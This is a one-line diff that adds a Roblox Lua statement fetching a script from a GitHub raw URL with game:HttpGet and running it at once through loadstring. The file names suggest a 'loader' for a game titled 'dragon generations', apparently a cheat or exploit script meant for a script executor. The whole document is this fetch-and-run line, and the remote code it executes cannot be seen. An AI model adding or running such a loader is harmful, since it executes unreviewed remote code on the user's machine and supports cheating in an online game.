@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SmartHammerAnimate/loaders/main/loaders/path-2-mobile-dragon-generations-spam1-93rphj85jmolcx.lua"))()
